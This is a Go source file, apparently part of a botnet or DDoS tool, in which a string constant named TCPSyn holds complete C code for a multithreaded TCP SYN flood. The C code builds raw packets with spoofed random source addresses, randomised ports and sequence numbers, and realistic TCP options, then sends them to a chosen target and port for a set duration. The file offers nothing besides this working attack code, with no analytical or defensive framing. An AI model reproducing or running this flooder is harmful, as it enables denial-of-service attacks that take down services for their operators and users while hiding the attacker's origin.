package payloads

var TCPSyn = `
// ==================== TCP SYN FLOOD MODULE ====================
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#define PROTO_tcpOPT_MSS 2
#define PROTO_tcpOPT_SACK 4
#define PROTO_tcpOPT_TSVAL 8
#define PROTO_tcpOPT_WSS 3

static int tcp_syn_running = 0;
static pthread_t tcp_syn_threads[100];

unsigned short csum_tcp(unsigned short *buf, int count) {
    register unsigned long sum = 0;
    while (count > 1) { sum += *buf++; count -= 2; }
    if (count > 0) sum += *(unsigned char *)buf;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (unsigned short)(~sum);
}

unsigned short tcpcsum_syn(struct iphdr *iph, struct tcphdr *tcph, int psize) {
    struct tcp_pseudo {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr) + psize);
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr) + psize;
    unsigned short *tcp = malloc(totaltcp_len);
    memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr) + psize);
    unsigned short output = csum_tcp(tcp, totaltcp_len);
    free(tcp);
    return output;
}

void *tcp_syn_flood(void *arg) {
    char *target_ip = (char *)arg;
    int port = *(int *)((char *)arg + 64);
    int duration = *(int *)((char *)arg + 68);
    
    char datagram[128];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
    uint8_t *options = (uint8_t *)(tcph + 1);
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(target_ip);
    
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) return NULL;
    
    int tmp = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp));
    
    memset(datagram, 0, 128);
    
    iph->version = 4;
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 20);
    iph->id = htons(rand() & 0xFFFF);
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = rand();
    iph->daddr = sin.sin_addr.s_addr;
    
    tcph->source = htons(rand() & 0xFFFF);
    tcph->dest = htons(port);
    tcph->seq = htonl(rand());
    tcph->doff = 10;
    tcph->syn = 1;
    tcph->window = htons(64240);
    
    *options++ = PROTO_tcpOPT_MSS;
    *options++ = 4;
    *((uint16_t *)options) = htons(1400);
    options += 2;
    
    *options++ = PROTO_tcpOPT_SACK;
    *options++ = 2;
    
    *options++ = PROTO_tcpOPT_TSVAL;
    *options++ = 10;
    *((uint32_t *)options) = rand();
    options += 4;
    *((uint32_t *)options) = 0;
    options += 4;
    
    *options++ = 1;
    
    *options++ = PROTO_tcpOPT_WSS;
    *options++ = 3;
    *options++ = 6;
    
    time_t start = time(NULL);
    
    while (tcp_syn_running && time(NULL) - start < duration) {
        iph->saddr = rand();
        iph->id = htons(rand() & 0xFFFF);
        iph->check = 0;
        iph->check = csum_tcp((unsigned short *)iph, sizeof(struct iphdr));
        
        tcph->source = htons(rand() & 0xFFFF);
        tcph->seq = htonl(rand());
        tcph->check = 0;
        tcph->check = tcpcsum_syn(iph, tcph, 20);
        
        sendto(s, datagram, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));
        usleep(10);
    }
    
    close(s);
    return NULL;
}

void start_tcp_syn_attack(char *target, int port, int threads, int duration_sec) {
    if (tcp_syn_running) return;
    tcp_syn_running = 1;
    
    char *arg = malloc(128);
    strcpy(arg, target);
    *((int *)(arg + 64)) = port;
    *((int *)(arg + 68)) = duration_sec;
    
    for (int i = 0; i < threads; i++) {
        pthread_create(&tcp_syn_threads[i], NULL, tcp_syn_flood, arg);
    }
    
    sleep(duration_sec);
    tcp_syn_running = 0;
    for (int i = 0; i < threads; i++) {
        pthread_join(tcp_syn_threads[i], NULL);
    }
    free(arg);
}

void stop_tcp_syn_attack() { tcp_syn_running = 0; }
// ==================== END TCP SYN MODULE ====================
`